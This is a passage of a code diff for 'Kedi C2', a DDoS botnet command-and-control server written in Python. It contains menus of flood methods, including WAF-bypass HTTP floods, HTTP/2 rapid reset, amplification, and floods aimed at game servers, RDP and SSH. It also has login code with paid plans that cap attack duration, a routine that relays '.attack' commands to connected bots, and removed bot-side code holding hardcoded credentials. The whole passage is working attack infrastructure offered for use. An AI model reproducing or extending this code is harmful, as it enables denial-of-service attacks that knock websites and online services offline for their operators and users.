+\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}!methods      {LIGHTRED}:     {LIGHTGREEN}SHOW LAYER7 & LAYER4 METHODS {LIGHTRED}•
+\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}!print        {LIGHTRED}:     {LIGHTGREEN}PRINT A WORD {LIGHTRED}•
+\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}!base64-ecd   {LIGHTRED}:     {LIGHTGREEN}BASE 64 ENCODE {LIGHTRED}•
+\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}!base64-dcd   {LIGHTRED}:     {LIGHTGREEN}BASE 64 DECODE {LIGHTRED}•
+\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}!u2t          {LIGHTRED}:     {LIGHTGREEN}CONVERT URL TO TARGET {LIGHTRED}•
+\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}!t2u          {LIGHTRED}:     {LIGHTGREEN}CONVERT TARGET TO URL {LIGHTRED}•\n
+\r{LIGHTRED} - {LIGHTMAGENTA}✿ {LIGHTGREEN}Kedi C2 {LIGHTRED}- {LIGHTYELLOW}Version 1.0 {LIGHTRED}- {LIGHTGREEN}Created By Exploit {LIGHTRED}- @{LIGHTBLUE}itzexpl0it {LIGHTMAGENTA}✿\n{LIGHTWHITE}
+"""
 
-def main():
+layer7 = f"""
+
+\r{LIGHTRED} - {LIGHTYELLOW}Layer7\n
+\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}raw          {LIGHTRED}:     {LIGHTGREEN}HIGH PPS GET FLOOD {LIGHTRED}•
+\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}get          {LIGHTRED}:     {LIGHTGREEN}GET FLOOD {LIGHTRED}•
+\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}rapid-reset  {LIGHTRED}:     {LIGHTGREEN}HTTP/2.0 FLOOD USING LEGIT HEADERS WITH RAPID RESET EXPLOIT AND FLOOD WITH PROXY AND SSL , TLS {LIGHTRED}•
+\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}spoof        {LIGHTRED}:     {LIGHTGREEN}GET HEADER SPOOF FLOOD {LIGHTRED}•
+\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}post         {LIGHTRED}:     {LIGHTGREEN}POST FLOOD {LIGHTRED}•
+\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}put          {LIGHTRED}:     {LIGHTGREEN}PUT FLOOD {LIGHTRED}•
+\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}bypass       {LIGHTRED}:     {LIGHTGREEN}HTTP1.1 FLOOD WITH SSL AND HEADER & IP SPOOF AND BYPASS ALL WAFs {LIGHTBLUE}({LIGHTGREEN} Cloudflare {LIGHTRED},{LIGHTGREEN} ArvanCloud {LIGHTRED},{LIGHTGREEN} Akamai {LIGHTRED},{LIGHTGREEN} Fastly{LIGHTBLUE} ) {LIGHTRED}•
+\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}browser      {LIGHTRED}:     {LIGHTGREEN}CHROME BASED FLOOD MADE FOR BYPASS CAPTCHA & UAM {LIGHTRED}•
+\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}http         {LIGHTRED}:     {LIGHTGREEN}GET FLOOD WITHOUT SSL , TLS {LIGHTRED}•
+\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}xmlrpc       {LIGHTRED}:     {LIGHTGREEN}WORDPRESS XMLRPC POST FLOOD WITH XML DATA {LIGHTRED}•
+\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}http-mix     {LIGHTRED}:     {LIGHTGREEN}GET & POST & HEAD MIX FLOOD HIGH PPS {LIGHTRED}•
+\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}spoof-storm  {LIGHTRED}:     {LIGHTGREEN}GET HEADER SPOOF FLOOD WITH PROXY SOCKS5 AND HIGH PPS FLOOD {LIGHTRED}•
+\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}https        {LIGHTRED}:     {LIGHTGREEN}GET HTTP/2.0 FLOOD WITH SSL , TLS AND FLOOD WITH PROXY & HIGH PPS {LIGHTRED}•\n
+\r{LIGHTRED} - {LIGHTMAGENTA}✿ {LIGHTGREEN}Kedi C2 {LIGHTRED}- {LIGHTYELLOW}Version 1.0 {LIGHTRED}- {LIGHTGREEN}Created By Exploit {LIGHTRED}- @{LIGHTBLUE}itzexpl0it {LIGHTMAGENTA}✿\n{LIGHTWHITE}
+"""
+
+layer4 = f"""
+
+\r{LIGHTRED} - {LIGHTYELLOW}Layer4\n
+\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}udp          {LIGHTRED}:     {LIGHTGREEN}UDP FLOOD RANDOM DATA  {LIGHTRED}•
+\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}tcp          {LIGHTRED}:     {LIGHTGREEN}TCP FLOOD RANDOM DATA {LIGHTRED}•
+\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}gudp         {LIGHTRED}:     {LIGHTGREEN}UDP HEX FLOOD {LIGHTRED}•
+\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}gtcp         {LIGHTRED}:     {LIGHTGREEN}TCP HEX FLOOD {LIGHTRED}•
+\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}dns          {LIGHTRED}:     {LIGHTGREEN}DNS FLOOD {LIGHTRED}•
+\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}syn          {LIGHTRED}:     {LIGHTGREEN}SYN FLOOD {LIGHTRED}•
+\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}udp-bypass   {LIGHTRED}:     {LIGHTGREEN}UDP FLOOD & BEST HEX PAYLOAD {LIGHTRED}•
+\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}tcp-bypass   {LIGHTRED}:     {LIGHTGREEN}TCP FLOOD & BEST HEX PAYLOAD {LIGHTRED}•
+\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}ts3          {LIGHTRED}:     {LIGHTGREEN}TS3 KILLER {LIGHTRED}•
+\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}fiv          {LIGHTRED}:     {LIGHTGREEN}FIVEM UDP MIX FLOOD {LIGHTRED}•
+\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}vse          {LIGHTRED}:     {LIGHTGREEN}VALVE SOURCE ENGINE FLOOD {LIGHTRED}•
+\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}pps          {LIGHTRED}:     {LIGHTGREEN}UDP & TCP MIX FLOOD {LIGHTRED}•
+\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}game         {LIGHTRED}:     {LIGHTGREEN}TCP & UDP MIX ATTACK TO ALL GAMES {LIGHTBLUE}({LIGHTGREEN} MTA {LIGHTRED},{LIGHTGREEN} FIVEM {LIGHTRED},{LIGHTGREEN} MINCRAFT {LIGHTRED}, {LIGHTGREEN}DDNET {LIGHTRED},{LIGHTGREEN} CS2{LIGHTBLUE} ) {LIGHTRED}•
+\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}udp-raw      {LIGHTRED}:     {LIGHTGREEN}UDP RAW HEADER HEXADECIMAL WITH BYPASS FLOOD {LIGHTRED}•
+\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}tcp-raw      {LIGHTRED}:     {LIGHTGREEN}TCP RAW HEADER HEXADECIMAL WITH BYPASS FLOOD {LIGHTRED}•
+\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}r6           {LIGHTRED}:     {LIGHTGREEN}RainbowSix ( R6 ) CUSTOM UDP HEADER BYPASS FLOOD {LIGHTRED}•
+\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}tcp-boom     {LIGHTRED}:     {LIGHTGREEN}TCP AMPLIFICATION & TCP BYPASS FLOOD {LIGHTRED}•
+\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}udp-boom     {LIGHTRED}:     {LIGHTGREEN}WSD & UDP AMPLIFICATION & UDP BYPASS FLOOD {LIGHTRED}•
+\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}discord      {LIGHTRED}:     {LIGHTGREEN}DISCORD VOICE UDP FLOOD {LIGHTRED}•
+\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}tcp-paf      {LIGHTRED}:     {LIGHTGREEN}TCP & PSH MIX FLOOD {LIGHTRED}•
+\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}tcp-conn     {LIGHTRED}:     {LIGHTGREEN}TCP FLOOD TO PROTECTED SSL & TLSV1.2 DATA {LIGHTRED}•
+\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}tcp-hand     {LIGHTRED}:     {LIGHTGREEN}TCP HANDSHAKE HEX FLOOD {LIGHTRED}•
+\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}tcp-80       {LIGHTRED}:     {LIGHTGREEN}TCP FLOOD PORT 80 KILLER WITH HEX DATA {LIGHTRED}•
+\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}rdp          {LIGHTRED}:     {LIGHTGREEN}TCP FLOOD KILL RDP WITH HEX DATA {LIGHTRED}•
+\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}ssh          {LIGHTRED}:     {LIGHTGREEN}TCP FLOOD KILL SSH WITH HEX DATA {LIGHTRED}•
+\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}tcp-storm    {LIGHTRED}:     {LIGHTGREEN}NORMAL TCP BYPASS WITH HEX DATA {LIGHTRED}•\n
+\r{LIGHTRED} - {LIGHTMAGENTA}✿ {LIGHTGREEN}Kedi C2 {LIGHTRED}- {LIGHTYELLOW}Version 1.0 {LIGHTRED}- {LIGHTGREEN}Created By Exploit {LIGHTRED}- @{LIGHTBLUE}itzexpl0it {LIGHTMAGENTA}✿\n{LIGHTWHITE}
+"""
+
+kedis = []
+online_users = []
+
+banne = text2Gen(banner1)
+
+def isp(target , conn):
+    now = datetime.now()
+    current_datetime = datetime.now()
+    date = current_datetime.date()
+    timee = now.strftime('%H:%M:%S')
+    response = get(f"http://ip-api.com/json/{target}")
+    response.raise_for_status()
+    dat = response.json()
+    isp = dat['as']
+    city = dat['city']
+    zone = dat['timezone']
+    isp_banner = f"""
+\r{LIGHTCYAN}╔══════════════════════════════════════════════════════════════════╗
+\r{LIGHTYELLOW} Date   {LIGHTRED}: {LIGHTYELLOW}[ {LIGHTGREEN}{date}{LIGHTYELLOW} ]
+\r{LIGHTYELLOW} Time   {LIGHTRED}: {LIGHTYELLOW}[ {LIGHTGREEN}{timee}{LIGHTYELLOW} ]
+\r{LIGHTYELLOW} Isp    {LIGHTRED}: {LIGHTYELLOW}[ {LIGHTGREEN}{isp}{LIGHTYELLOW} ]
+\r{LIGHTYELLOW} Zone   {LIGHTRED}: {LIGHTYELLOW}[ {LIGHTGREEN}{zone}{LIGHTYELLOW} ]
+\r{LIGHTYELLOW} City   {LIGHTRED}: {LIGHTYELLOW}[ {LIGHTGREEN}{city}{LIGHTYELLOW} ]
+\r{LIGHTYELLOW} Tool   {LIGHTRED}: {LIGHTYELLOW}[ {LIGHTRED}Kedi{LIGHTGREEN}-{LIGHTCYAN}C2{LIGHTYELLOW} ]
+\r{LIGHTCYAN}╚══════════════════════════════════════════════════════════════════╝\n
+"""
+    conn.send(isp_banner.encode())
+
+def monitor_file():
+    if not path.isfile(file_path):
+        with open(file_path, 'w'):
+            pass
+    last_position = path.getsize(file_path) 
     while True:
-        s = None
-        connected = False
+        try:
+            with open(file_path, 'r') as file:
+                file.seek(last_position)
+                new_content = file.read() 
+                if new_content:
+                    last_position = file.tell() 
+                sleep(1)
+        except Exception as e:
+            pass
 
-        while not connected:
+def load_attacks():
+    if path.exists(file_path):
+        with open(file_path , 'r') as file:
             try:
-                s = socket(AF_INET, SOCK_STREAM)
-                s.connect((ipc2, portc2))
-                print("VPN connected.")
-                connected = True 
-                while True:
-                    data = s.recv(1024)
-                    if b"Username" in data:
-                        s.send("kediam".encode())
-                        break
-                while True:
-                    data = s.recv(1024)
-                    if b"Password" in data:
-                        s.send("FSOCIETY".encode())
-                        break
-            except Exception as e:
-                if s:
-                    try:
-                        s.close()
-                    except:
-                        pass
-                s = None
-                sleep(5)
+                return load(file)
+            except:
+                return {}
+    return {}
+
+def save_attacks(attacks):
+    with open(file_path , 'a') as file:
+        dump(attacks, file)
+
+i = 0
+
+def app(conn , addr):
+    try:
+        conn.send("\033c".encode())
+        conn.send(banne.encode())
+        conn.send(f"\033]0; / Kedi C2 - Powerfull C2/Botnet - Please login to run the program - {datetime.now().date()} \\\007".encode())
+        conn.send(f"\r{LIGHTGREEN}  Welcome {LIGHTRED}- {LIGHTCYAN}Please login to run the program {LIGHTRED}- {LIGHTWHITE}THX\n".encode())
+        def monitor_file(file_path='src/users.json'):
+            if not path.isfile(file_path):
+                with open(file_path , 'a'):
+                    pass
+            last_position = path.getsize(file_path) 
+            while True:
+                try:
+                    with open(file_path , 'r') as file:
+                        file.seek(last_position)
+                        new_content = file.read() 
+                        if new_content:
+                            last_position = file.tell() 
+                        sleep(0.5)
+                except:
+                    pass
+        def is_user_banned(uname , ban_file='src/ban.json'):
+            banned_users = load_files(ban_file)
+            return uname in banned_users
+        def passwd():
+            while True:
+                conn.send(f"\r  {LIGHTRED}[{LIGHTYELLOW}+{LIGHTRED}]{LIGHTGREEN} Password {LIGHTRED}:\x1b[0;38;2;0;0;0m ".encode())
+                passw = conn.recv(1024).decode('cp1252').strip()
+                pslis = [details.get('password', 'N/A') for id, details in data.items()]
+                if passw in pslis:
+                    return passw
+                else:
+                    pass
+        user = ''
+        while True:
+            conn.send(f"\r  {LIGHTRED}[{LIGHTYELLOW}+{LIGHTRED}]{LIGHTGREEN} Username {LIGHTRED}:{LIGHTCYAN} ".encode())
+            user = conn.recv(1024).decode("cp1252").strip()
+            with open('src/users.json' , 'r') as file:
+                data = load(file)
+            urlis = [details.get('user', 'N/A') for id, details in data.items()]
+            if user in urlis:
+                break
+        passwd()  
+        def get_online_users():
+            online_usernames = []
+            for conn in online_users:
+                username = getattr(conn, 'user', None)
+                if username:
+                    online_usernames.append(username)
+            return online_usernames
+        plan = next((details.get("plan", "N/A") for id, details in data.items() if details.get("user") == user), None)
+        conn.send(banner_xd.encode())
+        if user != 'kediam':
+            online_users.append(conn)
+        if user == "kediam":
+            kedis.append(conn)
+        else:
+            pass
+        if user != "kediam":
+            print(f'\n  {red}[{yellow}+{red}] {green}Client Connected {LIGHTMAGENTA}( {LIGHTCYAN}{user}{LIGHTMAGENTA} ) {red}: {blue}kedis {red}: {yellow}{len(kedis)}')
+        if is_user_banned(user):
+            conn.send(f"\r\n\t{LIGHTRED}[{LIGHTYELLOW}+{LIGHTRED}]{LIGHTGREEN} You Are Banned".encode())
+            conn.close()
+            online_users.remove(conn)
+        conn.send(f"\033]0; / Kedi C2 - Powerfull C2/Botnet - By Exploit - Bots : {len(kedis)} - User : {user} - Online : {len(online_users)} - Plan : {plan} - {datetime.now().date()} \\\007".encode())
+        def checker():
+            try:
+                while 1:
+                    dead_bots = []
+                    for bot in kedis:
+                        try:
+                            bot.settimeout(5)
+                            bot.send(b'[+]ping')
+                            if bot.recv(1024).decode() != '[+]pong':
+                                dead_bots.append(bot)
+                        except:
+                            pass
+                    for bot in dead_bots:
+                        bot.close()
+                        kedis.remove(bot) 
+                    conn.send(f"\033]0; [/] / Kedi C2 - Powerfull C2/Botnet - By Exploit - Bots : {len(kedis)} - User : {user} - Online : {len(online_users)} - Plan : {plan} - {datetime.now().date()} \\\007".encode())
+                    sleep(1)
+                    conn.send(f"\033]0; [-] / Kedi C2 - Powerfull C2/Botnet - By Exploit - Bots : {len(kedis)} - User : {user} - Online : {len(online_users)} - Plan : {plan} - {datetime.now().date()} \\\007".encode())
+                    sleep(1)
+                    conn.send(f"\033]0; [\] / Kedi C2 - Powerfull C2/Botnet - By Exploit - Bots : {len(kedis)} - User : {user} - Online : {len(online_users)} - Plan : {plan} - {datetime.now().date()} \\\007".encode())
+                    sleep(1)
+                    conn.send(f"\033]0; [|] / Kedi C2 - Powerfull C2/Botnet - By Exploit - Bots : {len(kedis)} - User : {user} - Online : {len(online_users)} - Plan : {plan} - {datetime.now().date()} \\\007".encode())
+                    sleep(1)
+            except:
+                pass
+        thr(target=checker).start()
         try:
             while True:
                 try:
-                    data = s.recv(1024)
-                    if not data:
-                        raise ConnectionResetError("Connection closed by server.")
-                    try:
-                        c2 = data.decode('utf-8', errors='ignore').strip()
-                    except UnicodeDecodeError as e:
-                        continue
+                    conn.send(f"\r\033\33[100m {LIGHTWHITE}✧ {user} • KediC2 ✧ \033[0;0m ►►\x1b[38;5;27m ".encode())
+                    data = conn.recv(1024).decode()
+                    conn.send(f"\033]0; / Kedi C2 - Powerfull C2/Botnet - By Exploit - Bots : {len(kedis)} - User : {user} - Online : {len(online_users)} - Plan : {plan} - {datetime.now().date()} \\\007".encode())
+                    bots = f"""
 
-                    if c2.split()[0] == '!att':
-                        method = str(c2.split()[1])
-                        url = str(c2.split()[2])
-                        port = int(c2.split()[3])
-                        threads = int(c2.split()[4])
-                        rpc = int(c2.split()[5])
-                        timme = int(c2.split()[6])
-                        timer = time() + timme
-                    elif c2.split()[0] == '!proxy':
-                        thr(target=socks5geter).start()
-                except Exception as e:
-                    break
-        except:
-            pass
+\r\t{LIGHTYELLOW}╔══════════════════════════════════════════════════════════════════╗
+\r
+\r\t {LIGHTGREEN}   Bots {LIGHTRED}: {LIGHTMAGENTA}{len(kedis)}
+\r\t {LIGHTGREEN}   C2/Botnet {LIGHTRED}: {LIGHTMAGENTA}Kedi C2/Botnet
+\r
+\r\t{LIGHTYELLOW}╚══════════════════════════════════════════════════════════════════╝\n
+"""
+                    if data.split()[0] == '.attack':
+                        try:
+                            method = str(data.split()[1])
+                            t4rget = str(data.split()[2])
+                            p0rt = int(data.split()[3])
+                            thr34d = int(data.split()[4])
+                            rpc = int(data.split()[5])
+                            tim3 = int(data.split()[6])
+                            max_time = 0
+                            if plan == "KEDI":
+                                max_time = 60
+                                max_thread = 20
+                                max_rpc = 128
+                            elif plan == "VIP":
+                                max_time = 120
+                                max_thread = 50
+                                max_rpc = 500
+                            elif plan == "OWNER":
+                                max_time = 180
+                                max_thread = 1000
+                                max_rpc = 1500
+                            if tim3 > max_time:
+                                conn.send(f"\r\n{LIGHTRED}[{LIGHTYELLOW}+{LIGHTRED}] {LIGHTGREEN}Your plan ({plan}) allows a maximum time of {max_time} seconds :))\n".encode())
+                                continue
+                            if thr34d > max_thread:
+                                conn.send(f"\r\n{LIGHTRED}[{LIGHTYELLOW}+{LIGHTRED}] {LIGHTGREEN}Your plan ({plan}) allows a maximum thread of {max_thread} :))\n".encode())
+                                continue
+                            if rpc > max_rpc:
+                                conn.send(f"\r\n{LIGHTRED}[{LIGHTYELLOW}+{LIGHTRED}] {LIGHTGREEN}Your plan ({plan}) allows a maximum rpc of {max_rpc} :))\n".encode())
+                                continue
+                            parsed_url = urlparse(t4rget)
+                            target = parsed_url.netloc
+                            now = datetime.now()
+                            current_datetime = datetime.now()
+                            date = current_datetime.date()
+                            timee = now.strftime('%H:%M:%S')
+                            response = get(f"http://ip-api.com/json/{target}")
+                            response.raise_for_status()
+                            dat = response.json()
+                            isp = dat['as']
+                            city = dat['city']
+                            zone = dat['timezone']
+                            def att():
+                                try:
+                                    global i
+                                    i += 1
+                                    attack_json = {
+                                        i: {
+                                            "method": method,
+                                            "url": t4rget,
+                                            "port": p0rt,
+                                            "time": tim3,
+                                            "attime": time(),
+                                            "user": user
+                                        }
+                                    }
+                                    attacks = load_attacks()
+                                    attacks.update(attack_json)
+                                    save_attacks(attacks)
+                                except Exception as e:
+                                    print(e)
+                            def rmon():
+                                while True:
+                                    try:
+                                        sleep(5)
+                                        attacks = load_attacks()
+                                        current_time = time()
+                                        for attack_id in list(attacks.keys()):
+                                            if current_time - attacks[attack_id]['attime'] > tim3:
+                                                del attacks[attack_id]
+                                        save_attacks(attacks)
+                                    except Exception as e:
+                                        print(f"Error in rmon: {e}")
+                            thr(target=monitor_file , daemon=True).start()
+                            thr(target=rmon , daemon=True).start()
+                            thr(target=att , daemon=True).start()
+                        except:
+                            pass
+                        try:
+                            data = data.replace(".attack" , "!att")
+                            attack_banner = f"""\033c
+\r{RESET}██████▓▓████░▒░   ░░       ░ ░▒░░░░░░ ░░▒▒███████{LIGHTWHITE}  Status   {LIGHTRED}: {LIGHTYELLOW}[ {LIGHTGREEN}𝙰𝚝𝚝𝚊𝚌𝚔 𝚂𝚝𝚊𝚛𝚝𝚎𝚍 𝚂𝚎𝚌𝚌𝚎𝚜𝚏𝚞𝚕 {LIGHTYELLOW}]
+\r{RESET}█████████▓█▓██▓▒ ░░░ ░░▓████░ ░▒░░░░░   ▒░███████{LIGHTWHITE}   Method  {LIGHTRED}: {LIGHTYELLOW}[ {LIGHTPINK}{method} {LIGHTYELLOW}]
+\r{RESET}██████▓█▓▓█▓▒░░░░    ░░░░░░░░░░░░░░░░  ░▒▒▒█▓████{LIGHTWHITE}   Target  {LIGHTRED}: {LIGHTYELLOW}[ {LIGHTCYAN}{t4rget} {LIGHTYELLOW}]
+\r{RESET}████████▓█▓ ▒▓▒▒▓█  ░░░░▒▓▓█░░▒▒░░░░░    ░░▓▓████{LIGHTWHITE}   Port    {LIGHTRED}: {LIGHTYELLOW}[ {LIGHTRED}{p0rt} {LIGHTYELLOW}]
+\r{RESET}█████░██▓█▓▒▓▓██▒█░░░▓▒█ ███▒▒▒▒░▒▒░░░  ░▒▒▒▒▒███{LIGHTWHITE}   Thread  {LIGHTRED}: {LIGHTYELLOW}[ {LIGHTBLUE}{thr34d} {LIGHTYELLOW}]
+\r{RESET}█████▓████████▓▒▒█░▒░▒▒▓▓▓█▓▓▓▒▒▒░░▒░░▒▒░░▒▒░▒███{LIGHTWHITE}   Rpc     {LIGHTRED}: {LIGHTYELLOW}[ {LIGHTWHITE}{rpc} {LIGHTYELLOW}]
+\r{RESET}██████████▒▓░░▒░█▒▒▒▒▒▒░▒░░░▒▒▒░▒▒▒▒▒▒▓░░░█▒░░▒▒█{LIGHTWHITE}   Time    {LIGHTRED}: {LIGHTYELLOW}[ {LIGHTBLSYN}{tim3} {LIGHTYELLOW}]
+\r{RESET}███████▓██░░░░░█▒░░░▓▒░░░░░ ░░░▒▒▓▒▓██░ ▒█░▓  ▒░▒{LIGHTWHITE}
+\r{RESET}██████████░░░ ░█░ ░░▒░▒░░░░░░░░░▒▒▒▓█░  ▒ ░░░░░  {LIGHTWHITE}  Info     {LIGHTRED}: {LIGHTYELLOW}[{LIGHTGREEN} 𝙸𝚗𝚏𝚘 𝙰𝚌𝚚𝚞𝚒𝚜𝚒𝚝𝚒𝚘𝚗 𝚂𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕 {LIGHTYELLOW}]
+\r{RESET}██████████▓▒  ▒▒██▒░░▒░░░▒░░░░░░▒▒▓▒▓ ░▒░░▒░  ░█▒{LIGHTWHITE}   Date    {LIGHTRED}: {LIGHTYELLOW}[ {LIGHTPINK}{date} {LIGHTYELLOW}]
+\r{RESET}██████████▒▓▒░░░ ░░  ░░░░░░░░░░ ▒▒▒▒░░▒▓█░░░█░▓██{LIGHTWHITE}   Isp     {LIGHTRED}: {LIGHTYELLOW}[ {LIGHTCYAN}{isp} {LIGHTYELLOW}]
+\r{RESET}██████████▒▒▓▓▒░▒▒▒░░▒▒░▒▒░     ▒░ ▒█████████████{LIGHTWHITE}   Zone    {LIGHTRED}: {LIGHTYELLOW}[ {LIGHTRED}{zone} {LIGHTYELLOW}]
+\r{RESET}████████████░ ▓█▓▒▒░  ▒██░░░    ▓ ███████████████{LIGHTWHITE}   City    {LIGHTRED}: {LIGHTYELLOW}[ {LIGHTBLUE}{city}{LIGHTYELLOW} ]
+\r{RESET}███████████▓█  █ ░░░▒ █▒░ ░ ░░ ░ ████████████████{LIGHTWHITE}   User    {LIGHTRED}: {LIGHTYELLOW}[{LIGHTWHITE} {user} {LIGHTYELLOW}]
+\r{RESET}████████████▓▓ █  ░▒░▓▓░       ████████████████▒▓{LIGHTWHITE}   Tool    {LIGHTRED}: {LIGHTYELLOW}[{LIGHTBLSYN} 𝙺𝚎𝚍𝚒 𝙲2/𝙱𝚘𝚝𝚗𝚎𝚝 {LIGHTYELLOW}]
+\r{RESET}█████████████▓░░█ ░▒░▒     ▒ █████████████████▓▒▓{LIGHTWHITE}
+\r{RESET}████████████████░█▒▒      ░██████████████████▒▓▒▒{LIGHTWHITE}
+\r{RESET}█████████████████▒░     ███████████████████▒░█▓▓█{RESET}\n
 
+\r\t{LIGHTRED}[{LIGHTYELLOW}+{LIGHTRED}] {LIGHTAQUA}𝓟𝓵𝓮𝓪𝓼𝓮 𝓐𝓯𝓽𝓮𝓻 𝓐𝓽𝓽𝓪𝓬𝓴 𝓣𝔂𝓹𝓮 {LIGHTRED}'{LIGHTPURPLE}.{LIGHTGREEN}home{LIGHTRED}' {LIGHTAQUA}𝓕𝓸𝓻 𝓑𝓪𝓬𝓴 𝓣𝓸 𝓗𝓸𝓶𝓮 {LIGHTWHITE}| {LIGHTPURPLE}[ {LIGHTPINK}𝚃𝚘𝚡𝚒𝚌𝚗𝚎𝚝 𝙾𝚗 𝚃𝚘𝚙 {LIGHTPURPLE}]{LIGHTRED} . {RESET}\n
+"""
+                            for kedi in kedis:
+                                kedi.send(data.encode())
+                        except:
+                            pass
+                        conn.send(attack_banner.encode())
+                        print(f"\n {red}[{yellow}+{red}] {green}Attack Started to {red}:{cyan} {data.split()[2]} {red}| {green}Method {red}:{cyan} {data.split()[1]} {red}|{green} Time {red}:{cyan} {data.split()[6]} {red}| {white}User {red}: {cyan}{user}")
+                        thr(target=checker).start()
+                    elif data.split()[0] == '!attack':
+                        conn.send(f"\r{LIGHTRED}[{LIGHTYELLOW}+{LIGHTRED}] {LIGHTWHITE}Layer7 {LIGHTRED}& {LIGHTWHITE}Layer4 {LIGHTBLUE}Attack {LIGHTRED}: {LIGHTGREEN}.attack {LIGHTRED}<{LIGHTYELLOW}method{LIGHTRED}> {LIGHTRED}<{LIGHTYELLOW}target{LIGHTRED}> {LIGHTRED}<{LIGHTYELLOW}port{LIGHTRED}> {LIGHTRED}<{LIGHTYELLOW}threads{LIGHTRED}> {LIGHTRED}<{LIGHTYELLOW}method{LIGHTRED}> {LIGHTRED}<{LIGHTYELLOW}rpc{LIGHTRED}> {LIGHTRED}<{LIGHTYELLOW}time{LIGHTRED}> {LIGHTCYAN}.\n".encode())
+                        conn.send(f"\r{LIGHTMAGENTA}[{LIGHTCYAN}#{LIGHTMAGENTA}] {LIGHTWHITE}Example Layer{LIGHTCYAN}7 {LIGHTRED}: {LIGHTGREEN}.attack {LIGHTBLUE}raw https://target.com/ 443 50 500 120\n".encode())
+                        conn.send(f"\r{LIGHTMAGENTA}[{LIGHTCYAN}#{LIGHTMAGENTA}] {LIGHTWHITE}Example Layer{LIGHTCYAN}4 {LIGHTRED}: {LIGHTGREEN}.attack {LIGHTMAGENTA}pps 1.1.1.1 53 50 500 120\n".encode())
+                        try:
+                            conn.send(f"\033]0; / Kedi C2 - Powerfull C2/Botnet - By Exploit - Bots : {len(kedis)} - User : {user} - Online : {len(online_users)} - Plan : {plan} - {datetime.now().date()} \\\007".encode())
+                            print(f"\n  {red}[{yellow}+{red}] {green}Banner Count bot sent secessful {red}& {white}User {red}: {cyan}{user}")
+                        except Exception as e:
+                            print(e)
+                    elif data.split()[0] == '?plan':
+                        if plan == "KEDI":
+                            max_time = 60
+                            max_thread = 20
+                            max_rpc = 128
+                        elif plan == "VIP":
+                            max_time = 120
+                            max_thread = 50
+                            max_rpc = 500
+                        elif plan == "OWNER":
+                            max_time = 180
+                            max_thread = 1000
+                            max_rpc = 1500
+                        banner_plan = f"""
+\r{LIGHTCYAN}  ╔══════════════════════════════════════════════════════════════════╗
+\r{LIGHTYELLOW}\t\t\t User   {LIGHTRED}: {LIGHTYELLOW}[ {LIGHTGREEN}{user}{LIGHTYELLOW} ]
+\r{LIGHTYELLOW}\t\t\t Plan   {LIGHTRED}: {LIGHTYELLOW}[ {LIGHTGREEN}{plan}{LIGHTYELLOW} ]
+\r{LIGHTYELLOW}\t\t\t Thread {LIGHTRED}: {LIGHTYELLOW}[ {LIGHTGREEN}{max_thread} (max){LIGHTYELLOW} ]
+\r{LIGHTYELLOW}\t\t\t Rpc    {LIGHTRED}: {LIGHTYELLOW}[ {LIGHTGREEN}{max_rpc} (max){LIGHTYELLOW} ]
+\r{LIGHTYELLOW}\t\t\t Time   {LIGHTRED}: {LIGHTYELLOW}[ {LIGHTGREEN}{max_time} (max){LIGHTYELLOW} ]
+\r{LIGHTYELLOW}\t\t\t Tool   {LIGHTRED}: {LIGHTYELLOW}[ {LIGHTRED}Kedi{LIGHTGREEN}-{LIGHTCYAN}C2{LIGHTYELLOW} ]
+\r{LIGHTCYAN}  ╚══════════════════════════════════════════════════════════════════╝\n
+"""
+                        conn.send(banner_plan.encode())
+                    elif data.split()[0] == '.ongoing':
+                        try:
+                            with open(file_path, 'r') as file:
+                                data = load(file)
+                            for id , details in data.items():
+                                method = details.get('method', 'N/A')
+                                urll = details.get('url', 'N/A')
+                                prt = details.get('port', 'N/A')
+                                timm = details.get('time', 'N/A')
+                                usr = details.get('user', 'N/A')
